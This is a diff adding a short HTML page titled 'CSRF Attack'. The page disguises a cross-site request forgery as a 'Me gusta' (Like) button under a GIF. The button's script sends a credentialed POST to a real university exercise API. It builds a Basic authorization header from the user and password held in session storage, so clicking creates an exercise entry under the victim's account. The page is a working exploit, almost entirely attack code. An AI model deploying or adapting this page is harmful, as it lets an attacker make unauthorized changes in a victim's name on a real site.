@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>CSRF Attack</title>
+</head>
+
+<body>
+    <h1>CSRF Attack</h1>
+    <img style="display: block;" src="https://c.tenor.com/ZAMoMuQgf9UAAAAd/tenor.gif" alt="CSRF Attack" width="200"
+        height="200">
+    <button style="margin-top: 2px;" onclick="hack()">Me gusta</button>
+
+    <script>
+        async function hack() {
+            await fetch("https://wipace.ujaen.es/api/ejercicio/mohr/", {
+                "credentials": "include",
+                "headers": {
+                    "Content-Type": "application/json",
+                    "Authorization": "Basic " + btoa(sessionStorage.getItem("user") + ':' + sessionStorage.getItem("pass")),
+                },
+                "referrer": "https://wipace.ujaen.es",
+                "body": "{\"dificultad\":1,\"enunciado\":\"asd\",\"ayuda\":\"\",\"video\":\"\",\"sx\":1,\"sy\":1,\"txy\":1,\"B\":1,\"E\":1,\"v\":1}",
+                "method": "POST"
+            });
+        }
+    </script>
+</body>
+
+</html>
